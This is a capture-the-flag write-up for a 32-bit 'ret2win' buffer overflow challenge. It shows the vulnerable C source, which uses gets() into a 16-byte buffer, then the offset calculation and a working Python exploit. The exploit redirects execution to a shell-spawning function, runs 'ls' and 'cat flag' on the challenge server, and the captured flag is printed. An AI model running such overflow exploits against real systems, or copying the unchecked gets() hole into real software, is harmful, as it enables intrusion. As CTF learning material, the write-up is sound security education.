# Baby Buffer Overflow - 32bit ✅

## Challenge Description
> ![image](https://github.com/user-attachments/assets/4d48194c-d8f7-4766-8078-737f5ad03d9a)


## Approach
We get the source code and a binary file:  

![image](https://github.com/user-attachments/assets/a19b9ac8-9c70-4947-9d9e-4da63035dad0)


2. From the code, we can see that the vuln function contains a buffer overflow vulnerability. It reads data into a 16-byte buffer using gets(), which doesn’t check for overflow—perfect for exploiting! This type of challenge is called `ret2win` (return to win(), which is a typical function name for such challenges).

```C
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```
The goal is to overflow the buffer in vuln to overwrite the return address with the address of target. When vuln finishes, it will “return” to target instead of going back to main, executing the shell function in target.
It's a 32-bit file using this library:  

![image](https://github.com/user-attachments/assets/97d43191-7b3a-48e7-ad36-820fc3b40a1d)

So I had to make sure I have it instealled otherwise I couldn't run it:  

```bash
sudo apt install musl:i386
```


Opening the binary in ghidra, we can see the address of the target function:  

![image](https://github.com/user-attachments/assets/4e7c2900-b0e8-46fa-9c1c-96bff2bd29aa)

And we know that the vuln function takes 24 characters. 

![image](https://github.com/user-attachments/assets/e9ba1d8e-1838-4849-bc9e-7bb25e2d0a54)

This being a 32-bit binary, gives us an offset of 28. Using the script below we can overflow and get to the target.

```python
import socket
import struct

# Address of the target function in little-endian format
target_addr = struct.pack('<I', 0x80491F5)  # Address of the target function

# Set the correct buffer size
buffer_size = 28  # Buffer size to reach the saved return address

# Craft the payload
payload = b'A' * buffer_size + target_addr

# Connect to the remote server
host = 'challenge.ctf.games'
port = 32336

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))

    # Receive the initial message from the server
    initial_message = s.recv(1024).decode()
    print("Initial Message:", initial_message)

    # Send the exploit payload
    s.send(payload + b'\n')
    print("Payload Sent:", payload)

    # Send the command to list files
    command = b'ls\n'  # List files
    s.send(command)
    print("Command Sent:", command)

    # Wait for the response after the ls command
    while True:
        try:
            data = s.recv(1024).decode()
            if data:
                print("Response:", data)
                if "flag" in data:  # If flag file is listed, read it
                    # Now send command to read the flag
                    read_flag_command = b'cat flag\n'
                    s.send(read_flag_command)
                    print("Command to read flag sent.")
            else:
                print("No more data received.")
                break
        except Exception as e:
            print("Error:", e)
            break

```

![image](https://github.com/user-attachments/assets/4cef3cbc-f686-4dce-b048-9f65be320e85)



`flag{4cd3b4079393e861af489ca063373f98}`




   



